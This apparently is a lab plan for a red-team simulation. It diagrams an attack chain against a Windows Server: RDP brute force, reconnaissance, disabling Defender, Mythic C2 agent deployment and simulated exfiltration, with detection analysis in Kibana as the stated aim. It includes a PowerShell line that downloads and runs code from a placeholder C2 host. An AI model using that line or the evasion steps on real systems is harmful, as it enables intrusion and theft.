
## 1. Introduction

Goal: Create an attack diagram that outlines the sequence of actions taken to compromise a target Windows Server, establish a C2 connection, and exfiltrate data. The diagram will be used as a visual plan for simulating and analyzing the attack.

Tool: draw.io (for creating the diagram)

---

## 2. Components of the Diagram

![https://www.drawio.com/assets/img/blog/threat-modelling-process-flow.png](https://www.drawio.com/assets/img/blog/threat-modelling-process-flow.png)

![https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.full.medium.png](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.full.medium.png)

![https://www.dnsfilter.com/hubfs/Imported_Blog_Media/6138e35e0ef28036125430bd_C2-attack-servers-2.png](https://www.dnsfilter.com/hubfs/Imported_Blog_Media/6138e35e0ef28036125430bd_C2-attack-servers-2.png)


- **Attacker Laptop (Kali Linux)**
    
    - Color: Red
    - Role: Launch brute force and control the attack.
        
- **Windows Server (Target Machine)**
    
    - Role: System to be compromised via RDP brute force.
        
- **Mythic C2 Server**
    
    - Color: Red
    - Role: Command and control platform for managing the compromised machine.
        
- **Internet**
    
    - Role: Communication channel between attacker and target.
        
- **SSH Server (optional)**
    
    - Role: Potential future target.
        

---

## 3. Attack Phases

### Phase 1: Initial Access

- Method: RDP brute force attack from attacker’s Kali Linux machine.
- Target: Windows Server.
- Goal: Gain successful authentication into the target system.

`event.code: 4625 (Failed) event.code: 4624 (Success)`

---

### Phase 2: Discovery

- After gaining access, the attacker runs basic reconnaissance commands to learn about the system:
    
    `whoami ipconfig net user net group`
    
- Goal: Identify user permissions, network configuration, and system information.

---

### Phase 3: Defense Evasion

- The attacker disables Windows Defender to bypass security controls.
- Command executed within the RDP session.
- Purpose: Prevent security tools from blocking the next steps.
    

---

### Phase 4: Execution

- Using PowerShell, the attacker downloads and executes the Mythic agent from the Mythic C2 server:
    
    `IEX (New-Object Net.WebClient).DownloadString('http://<C2_SERVER>/agent.ps1')`
    
- Goal: Install the agent and prepare for C2 communication.
    

---

### Phase 5: Command and Control (C2)

- The agent establishes a persistent connection back to the Mythic C2 server.
    
- The attacker now has remote command execution and monitoring capabilities on the target machine.
    

---

### Phase 6: Exfiltration

- The attacker simulates data theft by downloading a file (e.g., `password.txt`) from the target machine’s Documents folder through the C2 channel.
    
- This phase completes the full attack chain from initial access to data exfiltration.
    

---

## 4. Final Attack Flow Summary

1. Attacker (Kali Linux) → Brute forces RDP credentials on Windows Server.
    
2. Attacker logs into Windows Server.
    
3. Attacker runs discovery commands to learn about the environment.
    
4. Attacker disables Windows Defender for evasion.
    
5. Attacker uses PowerShell to download and execute Mythic agent.
    
6. Mythic agent connects to C2 server.
    
7. Attacker downloads `password.txt` as simulated exfiltration.
    

---

## 5. Outcome and Next Steps

- This diagram serves as a structured attack plan for future red team simulations.
    
- The attack steps can later be correlated with log data in Kibana to analyze detection and response capabilities.
    
- In the upcoming steps, the Mythic server will be set up to establish and manage the C2 channel.
**Reference**
https://youtu.be/jv-qiugJGHg?si=ZhkVu0mDS1YYAhDu